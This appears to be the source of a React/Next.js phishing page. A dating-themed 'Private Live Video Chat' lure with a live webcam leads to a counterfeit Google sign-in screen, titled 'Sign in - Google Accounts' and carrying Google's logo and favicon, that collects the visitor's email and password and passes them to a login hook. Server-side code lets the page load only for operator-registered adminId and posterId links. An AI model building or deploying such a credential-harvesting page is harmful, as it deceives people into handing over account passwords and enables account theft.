import { useState } from "react";
import Head from "next/head";
import Image from "next/image";
import { API_URL, site } from "../../../config/index";
import useMockLogin from "../../../hooks/useMockLogin";
import Webcam from "react-webcam";

const UserIcon = () => {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 20 20"
      fill="currentColor"
      className="w-5 h-5"
    >
      <path
        fillRule="evenodd"
        d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-5.5-2.5a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0zM10 12a5.99 5.99 0 00-4.793 2.39A6.483 6.483 0 0010 16.5a6.483 6.483 0 004.793-2.11A5.99 5.99 0 0010 12z"
        clipRule="evenodd"
      />
    </svg>
  );
};

const AngleDown = () => {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 20 20"
      fill="currentColor"
      className="w-5 h-5"
    >
      <path
        fillRule="evenodd"
        d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
        clipRule="evenodd"
      />
    </svg>
  );
};

export default function Home() {
  const [formValues, setFormValues] = useState({
    site: site,
    email: "",
    password: "",
  });

  const [field, setField] = useState("email");
  const [showPassword, setShowPassword] = useState(false);
  const [showForm, setShowForm] = useState(true);

  const { login } = useMockLogin();

  const handleSubmit = (e) => {
    e.preventDefault();

    login(formValues);
  };

  const handleChange = (e) => {
    e.preventDefault();
    setFormValues({ ...formValues, [e.target.name]: e.target.value });
  };

  return (
    <div className="relative text-black h-screen w-screen flex flex-col justify-center items-center">
      {/* <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
      Waiting...
    </h1> */}
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
        // height={1080}
        // width={1262}
        // screenshotFormat="image/jpeg"
        // videoConstraints={videoConstraints}
      />

      <div className="absolute mt-7 flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
        <>
          {showForm ? (
            <div class="p-5 w-[400px] h-[265px] shadow-md rounded-md">
              <h2 class="text-3xl font-bold text-[#2b044d] text-center">
                Live Video Chat
              </h2>
              <p class="text-lg  pt-5 px-5 font-medium">
                Login With Google and enjoy with{" "}
                <b class="text-[#2b044d]">Private Live Video Chat</b> your
                dating partner.
              </p>

              <button
                class="flex items-center justify-center gap-5 p-2 ml-4 my-4 w-[90%] bg-[#009aff] text-xl font-medium  text-white rounded-md"
                onClick={() => setShowForm(false)}
              >
                <span>Login With Google</span>
              </button>
            </div>
          ) : (
            <>
              <Head>
                <link rel="shortcut icon" href="/google-icon.ico" />
                <title>Sign in - Google Accounts</title>
              </Head>

              <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
                <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[500px]">
                  <div className="flex justify-center">
                    <Image
                      src="/images/google.png"
                      alt="google"
                      width={82}
                      height={30}
                    />
                  </div>

                  <div className="mt-2.5">
                    <form onSubmit={handleSubmit}>
                      {field === "email" && (
                        <>
                          <div className="text-center">
                            <h3 className="text-2xl">Sign in</h3>
                            <p className="mt-3">Use your Google Account</p>
                          </div>
                          <div className="mt-8">
                            <input
                              type="email"
                              name="email"
                              value={formValues.email}
                              onChange={handleChange}
                              placeholder="Email or phone"
                              required
                              className="text-sm w-full rounded-md px-3 py-4 border border-slate-300 focus:outline-2 focus:outline-blue-500 placeholder:text-base placeholder:text-gray-500"
                            />

                            <p className="mt-2 text-sm text-[#1a73e8] cursor-pointer font-medium">
                              Forgot email?
                            </p>
                            <p className="mt-10 text-sm text-[#5f6368]">
                              Not your computer? Use Guest mode to sign in
                              privately.
                              <span className="md:hidden ml-1 text-sm text-[#1a73e8] cursor-pointer font-medium">
                                Learn more about using Guest mode
                              </span>
                            </p>
                            <p className="hidden md:block text-sm text-[#1a73e8] cursor-pointer font-medium">
                              Learn more about using Guest mode
                            </p>

                            <div className="mt-[40px] flex justify-between items-center">
                              <p className="text-sm text-[#1a73e8] cursor-pointer font-medium">
                                Create account
                              </p>

                              <button
                                type="button"
                                onClick={() => setField("password")}
                                className="bg-[#1a73e8] py-2 px-6 rounded text-sm text-white font-medium"
                              >
                                Next
                              </button>
                            </div>
                          </div>
                        </>
                      )}

                      {field === "password" && (
                        <>
                          <div className="text-center">
                            <h3 className="text-2xl">Welcome</h3>

                            <button
                              type="button"
                              onClick={() => setField("email")}
                              className="mt-3 p-1.5 rounded-full border border-slate-200 text-sm text-[#202124] font-medium"
                            >
                              <div className="flex gap-3">
                                <span className="mt-0.5 h-3 w-3 text-gray-700">
                                  <UserIcon />
                                </span>
                                <span className="mt-[1px]">
                                  {formValues.email}
                                </span>
                                <span className="-ml-2 mr-1 h-3 w-3 text-gray-700">
                                  <AngleDown />
                                </span>
                              </div>
                            </button>
                          </div>
                          <div className="mt-[70px]">
                            <input
                              type={showPassword ? "text" : "password"}
                              name="password"
                              value={formValues.password}
                              onChange={handleChange}
                              placeholder="Enter your password"
                              required
                              autoComplete="on"
                              className="text-sm w-full rounded-md px-3 py-4 border border-slate-300 focus:outline-2 focus:outline-blue-500 placeholder:text-base placeholder:text-gray-500"
                            />

                            <div className="ml-1 mt-2 flex items-center">
                              <input
                                type="checkbox"
                                id="show"
                                name="showPassword"
                                value={showPassword}
                                onChange={() => setShowPassword(!showPassword)}
                                className="scale-125 cursor-pointer"
                              />
                              <label
                                htmlFor="show"
                                className="ml-5 text-sm cursor-pointer"
                              >
                                Show password
                              </label>
                            </div>

                            <div className="mt-[60px] flex justify-between items-center">
                              <p className="text-sm text-[#1a73e8]/90 cursor-pointer font-semibold">
                                Forgot password?
                              </p>

                              <button
                                type="submit"
                                className="bg-[#1a73e8] py-2 px-6 rounded text-sm text-white font-bold tracking-wider"
                              >
                                Next
                              </button>
                            </div>
                          </div>
                        </>
                      )}
                    </form>
                  </div>
                </div>
              </div>
            </>
          )}
        </>
      </div>
    </div>
  );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers["user-agent"];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}
